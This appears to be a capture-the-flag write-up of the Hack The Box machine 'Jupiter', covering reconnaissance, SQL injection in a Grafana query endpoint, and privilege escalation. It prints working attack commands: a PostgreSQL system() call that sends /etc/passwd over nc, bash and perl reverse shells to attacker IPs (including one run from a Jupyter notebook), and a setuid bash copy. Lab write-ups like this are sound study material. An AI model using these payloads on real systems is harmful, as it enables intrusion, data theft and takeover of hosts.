# Jupiter

### Reconnaissance

- port 22 SSH OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
- port 80 HTTP nginx 1.18.0 (Ubuntu)

jupiter.htb directories

/.htaccess            (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/css                  (Status: 301) [Size: 178] [--> http://jupiter.htb/css/]
/fonts                (Status: 301) [Size: 178] [--> http://jupiter.htb/fonts/]
/img                  (Status: 301) [Size: 178] [--> http://jupiter.htb/img/]
/js                   (Status: 301) [Size: 178] [--> http://jupiter.htb/js/]
/Source               (Status: 301) [Size: 178] [--> http://jupiter.htb/Source/]
/sass                 (Status: 301) [Size: 178] [--> http://jupiter.htb/sass/]

/sass indicates use of [sass-lang](https://sass-lang.com/guide/). Potential vulnerabilities (RCE)

Subdomain enumeration found kiosk subdomain, a grafana dashboard. Potential parameter injection

Grafana version 9.5.2, CVE-2023-0507 (stored XSS core plugin GeoMap), CVE-2023-2801 (Crash endpoint)

kiosk.jupiter.htb directories

/login                (Status: 200) [Size: 34390]
/metrics              (Status: 200) [Size: 129877]
/monitoring           (Status: 200) [Size: 34390]
/playlists            (Status: 200) [Size: 34390]
/robots.txt           (Status: 200) [Size: 26]
/signup               (Status: 200) [Size: 34390]
/styleguide           (Status: 200) [Size: 34390]
/verify               (Status: 200) [Size: 34390]

/public/public        (Status: 302) [Size: 31] [--> /public/]
/public/app           (Status: 302) [Size: 35] [--> /public/app/]
/public/build         (Status: 302) [Size: 37] [--> /public/build/]
/public/emails        (Status: 302) [Size: 38] [--> /public/emails/]
/public/fonts         (Status: 302) [Size: 37] [--> /public/fonts/]
/public/img           (Status: 302) [Size: 35] [--> /public/img/]
/public/lib           (Status: 302) [Size: 35] [--> /public/lib/]
/public/locales       (Status: 302) [Size: 39] [--> /public/locales/]
/public/maps          (Status: 302) [Size: 36] [--> /public/maps/]
/public/robots.txt    (Status: 200) [Size: 26]
/public/test          (Status: 302) [Size: 36] [--> /public/test/]
/public/views         (Status: 302) [Size: 37] [--> /public/views/]
/public/vendor        (Status: 302) [Size: 38] [--> /public/vendor/]

/api/live/ws looks like a websocket connection, when navigating to it the respoinse is bad request

/api/ds/query sql injection

found user grafana_viewer

PostgreSQL version 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1)

```
sqlmap -r grafana.sql -p "rawSql" --dump
sqlmap -r grafana.sql -p "rawSql" --dbs
sqlmap -r grafana.sql -p "rawSql" --tables
sqlmap -r grafana.sql -p "rawSql" --columns
sqlmap -r grafana.sql -p "rawSql" --users
sqlmap -r grafana.sql -p "rawSql" --passwords
sqlmap -r grafana.sql -p "rawSql" --file-read "/etc/passwd"
```

Tried dumping the moons DB but contains 160+ entries so very time consuming and ultimately useless. Used the 
following write ups to discover the PostgreSQL RCE query:

[HTB Jupiter write up](https://prathapilango.medium.com/jupiter-hackthebox-machine-writeup-2023-c2ee66cbfe0b)
[HTB-Jupiter](https://sawmj.github.io/posts/HTB-Jupiter/)

### Exploitation

Reverse shell through SQL query as postgres user

**pentest monkey PosgreSQL cheatsheet**

`CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6’, ‘system’ LANGUAGE ‘C’ STRICT; SELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080’);`

**Write-up payloads**

`CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.x/4444 0>&1\"'`

```
CREATE TABLE files(cmd_output text);

COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.10.16.67:1339\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';

-- Note the backslash to escape the double quote to be a correct format of JSON
```

Privesc to juno through network-simulation.yml file in /dev/shm, found with pspy

Edit server and host processes to create a bash binary with juno's permissions

```
/usr/bin/cp /bin/bash /tmp/bash

/usr/bin/chmod u+s /tmp/bash 
```

Add an ssh key with ssh-keygen or use the shadow-simulation.sh to get a reverse shell to access the user.txt
file as a member or the juno group

As juno check for files owned by jovian

`find / -user jovian 2>/dev/null`

This shows the /opt/solar-flare directory containing logs for the locally hosted jupyter notebook

Use ssh or chisel to access the jupyter notebook

`ssh -L 8888:127.0.0.1:8888 -i juno_id_rsa juno@10.10.11.216`

In the log files there are links to the notebook containing the access token

Use a new notebook to gain a reverse shell as jovian

`import os;os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'")`

Running `sudo -l` as jovian shows we have sudo access to `/usr/local/bin/sattrack`

When we execute sattrack it complains about a missing config file, use strings and grep to find references:

`strings /usr/local/bin/sattrack | grep config`

We find `/tmp/config.json` as a result. Searching for config.json shows a location of an example config file
at `/usr/local/share/sattrack/config.json`

Changing the `tlesources` to `file://path/to/file` gives us read access to root files
